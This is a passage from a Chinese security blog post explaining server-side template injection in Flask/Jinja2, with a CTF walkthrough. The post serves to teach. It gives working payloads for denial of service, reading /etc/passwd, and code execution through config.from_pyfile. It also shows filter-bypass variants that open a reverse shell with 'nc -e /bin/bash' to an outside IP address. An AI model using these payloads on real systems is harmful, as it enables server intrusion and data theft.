+<p>使用能直接爆出很多信息或者说环境变量，护网杯的web签到其实也是这个套路<br><img src="/img/8_1.jpg" alt="image"><br>但是这里并没有什么卵用<br>接下来看一下注入姿势<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">- requests对象，request对象是一个Flask模板全局变量，代表“当前请求对象（flask.request）”。当你在视图中访问request对象时，它包含了你预期想看到的所有信息。在request对象中有一个叫做environ的对象。request.environ是一个字典，其中包含和服务器环境相关的对象。该字典当中有一个shutdown_server的方法，相应的key值为werkzeug.server.shutdown。所以猜猜看我们向服务端注入&#123;&#123; request.environ\[&apos;werkzeug.server.shutdown&apos;\]()&#125;&#125;会发生什么？没错，会产生一个及其低级别的拒绝服务。当使用gunicorn运行应用程序时就不会存在这个方法，所以漏洞就有可能受到开发环境的限制。</span><br><span class="line"></span><br><span class="line">- config对象。config对象是一个Flask模板全局变量，代表“当前配置对象（flask.config）”。它是一个类似于字典的对象，其中包含了应用程序所有的配置值，包含若干独特方法的子类：from_envvar，from_object，from_pyfile，以及root_path。在大多数情况下，会包含数据库连接字符串，第三方服务凭据，SECRET_KEY之类的敏感信息。</span><br><span class="line">- 使用非常重要的内省组件： __mro__和__subclasses__属性。__mro__中的MRO代表方法解析顺序，并且在这里定义为，“是一个包含类的元组，而其中的类就是在方法解析的过程中在寻找父类时需要考虑的类”。__mro__属性以包含类的元组来显示对象的继承关系，它的父类，父类的父类，一直向上到object（如果是使用新式类的话）。它是每个对象的元类属性，但它却是一个隐藏属性，因为Python在进行内省时明确地将它从dir的输出中移除了。__subclasses__属性则在这里被定义为一个方法，“每个新式类保留对其直接子类的一个弱引用列表。此方法返回那些引用还存在的子类”。使用__mro__属性来访问对象的父类，使用__subclasses__属性来访问对象的子类。</span><br><span class="line">- &#123; &apos;&apos;.\_\_class\_\_.\_\_mro\_\_&#125;&#125;作为payload注入到SSTI漏洞点当中，使用索引来选择object类。现在我们到达了object类，我们使用__subclasses__属性来dump应用程序中使用的所有类（找到file类的索引）将&#123;&#123;&apos;&apos;.\_\_class\_\_.\_\_mro__[2].\_\_subclasses\_\_() &#125;&#125;注入到SSTI漏洞点当中　　</span><br><span class="line">- 任意文件读取POC:  </span><br><span class="line">   file类能够实例化文件对象，而且如果我们实例化了一个文件对象，那么我们就可用使用类似于read的方法来读取相关内容。找到file类的索引，在我的环境中&lt;type &apos;file&apos;&gt;类的索引是40，我们就注入&#123;&#123; &apos;&apos;\_\_class__.\_\_mro__[2].\_\_subclasses__\[40](&apos;/etc/passwd&apos;).read()&#125;&#125;。所以现在我们就证明了，通过Flask/Jinja2中的SSTI进行任意文件读取是有可能的。</span><br><span class="line">- 第一种代码执行POC：  </span><br><span class="line">  file类不仅去读文件，而且也可以向目标服务器的可写入路径中写文件，然后我们再通过SSTI漏洞第二种代码执行poc调用from_pyfile方法去compile文件并执行其中的内容。这就是一个二次进攻。将&#123;&#123; &apos;&apos;.\_\_class__.\_\_mro__[2].\_\_subclasses__()\[40](&apos;/tmp/owned.cfg&apos;, &apos;w&apos;).write(&apos;&lt;malicious code here&gt;&apos;&apos;) &#125;&#125;注入到SSTI漏洞点，然后在通过注入&#123;&#123; config.from_pyfile(&apos;/tmp/owned.cfg&apos;) &#125;&#125;调用编译过程。该代码在编译时将会被执行。这就实现了远程代码执行。</span><br><span class="line">- 第二种代码执行POC：  </span><br><span class="line">  充分地利用from_pyfile方法。将&#123;&#123; &apos;&apos;.\_\_class__.\_\_mro__[2].\_\_subclasses__()\[40](&apos;/tmp/owned.cfg&apos;, &apos;w&apos;).write(&apos;from subprocess import check_output\n\nRUNCMD = check_output\n&apos;) &#125;&#125;注入到SSTI漏洞点，注入&#123;&#123; config.from_pyfile(&apos;/tmp/owned.cfg&apos;) &#125;&#125;来将新的项目添加到config对象中，将&#123;&#123; config[&apos;RUNCMD&apos;\](&apos;/usr/bin/id&apos;,shell=True) &#125;&#125;注入到SSTI漏洞点。</span><br></pre></td></tr></table></figure></p>
+<p>但更多的时候可能是其它的框架，比如tornado<br><em>在我们判断出存在SSTI之后, 下一步要做的就是仔细阅读文档, 挖掘一下在当前的环境下有哪些可以利用的点</em></p>
+<p>SSTI命令执行getshell需要操作类的方法，但是这里class被过滤了需要绕过<br>wafbypass也是web永恒的话题<br>但是黑名单真是太不安全了，总会有各种各样的绕过方法<br>下面看一下这道题目的思路<br>这里采用request.args.param这个方法<br>它可以获取到param参数的值（不知道就去读flask源码<br>然后去选择object类<br>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;request[request.args.param][&apos;__mro__&apos;]&#125;&#125;&amp;param=__class__</span><br></pre></td></tr></table></figure></p>
+<p><img src="/img/8_3.jpg" alt="image"><br>获取的内容进行html实体编码一下，看到object类的索引为9<br>同样用get参数绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=&#123;&#123;request[request.args.param][%27__mro__%27][9][request.args.b]()&#125;&#125;&amp;param=__class__&amp;b=__subclasses__</span><br></pre></td></tr></table></figure></p>
+<p><img src="/img/8_4.jpg" alt="image"><br>找到file类的索引为40<br>构造payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=&#123;&#123;request[request.args.param][%27__mro__%27][9][request.args.b]()[40](%27/etc/passwd%27).read()&#125;&#125;&amp;param=__class__&amp;b=__subclasses__</span><br></pre></td></tr></table></figure></p>
+<p>成功读取到etc/passwd<br>尝试getshell<br>提供两种payload，但思路都是利用了from_pyfile方法。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">name=&#123;&#123;request[request.args.param][%27__mro__%27][9][request.args.b]()[40](&apos;/tmp/evil&apos;, &apos;w&apos;).write(&apos;from os import system%0aCMD = system&apos;)&#125;&#125;&amp;param=__class__&amp;b=__subclasses__</span><br><span class="line">name=&#123;&#123;config.from_pyfile(&apos;/tmp/evil&apos;)&#125;&#125;</span><br><span class="line">name=&#123;&#123;%20config[%27CMD%27](%27nc%20-e%20/bin/bash%20123.207.14.45%207777%27)%20&#125;&#125;</span><br><span class="line"></span><br><span class="line">name=&#123;&#123;request[request.args.param][%27__mro__%27][9][request.args.b]()(&apos;/tmp/owned.cfg&apos;, &apos;w&apos;).write(&apos;from subprocess import check_output\n\nRUNCMD = check_output\n&apos;) &#125;&#125;&amp;param=__class__&amp;b=__subclasses__  </span><br><span class="line">name=&#123;&#123; config.from_pyfile(&apos;/tmp/owned.cfg&apos;) &#125;&#125;</span><br><span class="line">name=&#123;&#123;%20config[%27RUNCMD%27](%27nc -e /bin/bash 123.207.14.45 7777%27,shell=True)%20&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>写到哪个文件都可以  </p>
+<p>使用grep直接搜索cnss<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gerp -r cnss /</span><br></pre></td></tr></table></figure></p>
+<p><em>/home/blacsheep/oh_th1s_is_f111ll11lg:cnss{10ve_You<em>B4by</em>@_@}</em></p>
+<p>明天上来看看能不能提权<br>后续会写一写Python沙盒逃逸的东西  </p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>其实我觉得是不大可能有开发会写出这种代码的，所以SSTI其实蛮鸡肋的(但是CTF中出现还是蛮多<br>因为SSTI产生的核心问题在于在渲染之前动态生成模板<br>而一般模板是放在固定的文件夹之下的<br>flask和Django的代码示例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># Flask</span><br><span class="line">@app.route(&apos;/&apos;)</span><br><span class="line">def safe():</span><br><span class="line">    return render_template(&apos;home.html&apos;, url=request.args.get(&apos;p&apos;))</span><br><span class="line"># Django</span><br><span class="line">def home(request):</span><br><span class="line">    return render(request, &apos;home.html&apos;, &#123;#DATA#&#125;)</span><br><span class="line"></span><br><span class="line">class MyView(TemplateView):</span><br><span class="line">    template_name = &apos;home.html&apos;</span><br><span class="line">    def get_context_data():</span><br><span class="line">        #DATA#</span><br></pre></td></tr></table></figure></p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="http://yoursite.com">N0rth3ty</a>
+            <p>原文链接：<a href="http://yoursite.com/2018/10/17/浅析SSTI/">http://yoursite.com/2018/10/17/浅析SSTI/</a>
+            <p>发表日期：<a href="http://yoursite.com/2018/10/17/浅析SSTI/">October 17th 2018, 12:32:46 am</a>
+            <p>更新日期：<a href="http://yoursite.com/2018/10/17/浅析SSTI/">October 21st 2018, 11:51:19 pm</a>
+            <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2018/10/19/提权从入门到自闭/" title= "提权从入门到自闭">
+                    <div class="nextTitle">提权从入门到自闭</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2018/10/15/Hash长度扩展攻击/" title= "Hash长度扩展攻击">
+                    <div class="prevTitle">Hash长度扩展攻击</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:northbhat@gmail.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/northity" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#SSTI"><span class="toc-number">1.</span> <span class="toc-text">SSTI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#注入原理"><span class="toc-number">2.</span> <span class="toc-text">注入原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#实例"><span class="toc-number">3.</span> <span class="toc-text">实例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 35
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/02</span><a class="archive-post-title" href= "/2019/03/02/Sql注入手册/" >Sql注入手册</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/29</span><a class="archive-post-title" href= "/2019/01/29/前端安全笔记/" >前端安全笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/17</span><a class="archive-post-title" href= "/2019/01/17/JSONP劫持/" >JSONP劫持</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/27</span><a class="archive-post-title" href= "/2018/12/27/SWPUCTF复现/" >SWPUCTF复现</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/29</span><a class="archive-post-title" href= "/2018/11/29/BCTF-Web签到/" >BCTF Web签到</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/26</span><a class="archive-post-title" href= "/2018/11/26/Docker入门笔记/" >Docker入门笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/22</span><a class="archive-post-title" href= "/2018/11/22/PHP反序列化补充/" >PHP反序列化补充</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/19</span><a class="archive-post-title" href= "/2018/11/19/从LCTF-WEB签到题看PHP反序列化/" >从LCTF WEB签到题看PHP反序列化</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/14</span><a class="archive-post-title" href= "/2018/11/14/phpphar协议对象注入/" >phpphar协议对象注入</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/12</span><a class="archive-post-title" href= "/2018/11/12/HCTF-WEB部分题解/" >HCTF WEB部分题解</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/12</span><a class="archive-post-title" href= "/2018/11/12/上海大学生信息安全竞赛Web题解/" >上海大学生信息安全竞赛Web题解</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/09</span><a class="archive-post-title" href= "/2018/11/09/SECCON-Web/" >SECCON Web</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/26</span><a class="archive-post-title" href= "/2018/10/26/phpinfo-with-LFI/" >phpinfo with LFI</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/23</span><a class="archive-post-title" href= "/2018/10/23/XSSme题目复现/" >XSSme题目复现</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/21</span><a class="archive-post-title" href= "/2018/10/21/渗透测试0x00-信息收集/" >渗透测试0x00 信息收集</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/19</span><a class="archive-post-title" href= "/2018/10/19/提权从入门到自闭/" >提权从入门到自闭</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/17</span><a class="archive-post-title" href= "/2018/10/17/浅析SSTI/" >浅析SSTI</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/15</span><a class="archive-post-title" href= "/2018/10/15/Hash长度扩展攻击/" >Hash长度扩展攻击</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/15</span><a class="archive-post-title" href= "/2018/10/15/护网杯Web-WP/" >护网杯Web WP</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/01</span><a class="archive-post-title" href= "/2018/10/01/XSSbot从入门到放弃/" >XSSbot从入门到放弃</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/12</span><a class="archive-post-title" href= "/2018/09/12/网鼎杯第三场WP/" >网鼎杯第三场WP</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/11</span><a class="archive-post-title" href= "/2018/09/11/浅谈XXE漏洞/" >浅谈XXE漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/11</span><a class="archive-post-title" href= "/2018/09/11/网鼎杯第一场WP/" >网鼎杯第一场WP</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/12</span><a class="archive-post-title" href= "/2018/06/12/Bugku题目集锦0x02/" >Bugku题目集锦0x02</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/07</span><a class="archive-post-title" href= "/2018/06/07/Bugku题目集锦0x01/" >Bugku题目集锦0x01</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/25</span><a class="archive-post-title" href= "/2018/05/25/Bugku题目集锦0x00/" >Bugku题目集锦0x00</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/03</span><a class="archive-post-title" href= "/2018/05/03/CISN-Writeup/" >CISN-Writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/22</span><a class="archive-post-title" href= "/2018/04/22/DDctf-Writrup/" >DDctf_Writrup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/01</span><a class="archive-post-title" href= "/2018/04/01/强网杯web部分writeup/" >强网杯web部分writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/07</span><a class="archive-post-title" href= "/2018/02/07/Python笔记 0x01/" >Python笔记 0x01</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/07</span><a class="archive-post-title" href= "/2018/02/07/Python笔记 0x02/" >Python笔记 0x02</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/04</span><a class="archive-post-title" href= "/2018/02/04/Python爬虫(一)/" >Python爬虫(一)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/03</span><a class="archive-post-title" href= "/2018/02/03/Python笔记 0x00/" >Python笔记 0x00</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/24</span><a class="archive-post-title" href= "/2018/01/24/教务系统成绩自动化推送脚本/" >教务系统成绩自动化推送脚本</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2017 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/01</span><a class="archive-post-title" href= "/2017/12/01/hexo博客的搭建/" >hexo博客搭建</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="WP"><span class="iconfont-archer">&#xe606;</span>WP</span>
+    
+        <span class="sidebar-tag-name" data-tags="Writeup"><span class="iconfont-archer">&#xe606;</span>Writeup</span>
+    
+        <span class="sidebar-tag-name" data-tags="前端安全"><span class="iconfont-archer">&#xe606;</span>前端安全</span>
+    
+        <span class="sidebar-tag-name" data-tags="Python"><span class="iconfont-archer">&#xe606;</span>Python</span>
+    
+        <span class="sidebar-tag-name" data-tags="服务器"><span class="iconfont-archer">&#xe606;</span>服务器</span>
+    
+        <span class="sidebar-tag-name" data-tags="Pentest"><span class="iconfont-archer">&#xe606;</span>Pentest</span>
+    
+        <span class="sidebar-tag-name" data-tags="Writeup SQL注入"><span class="iconfont-archer">&#xe606;</span>Writeup SQL注入</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "N0rth3ty"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
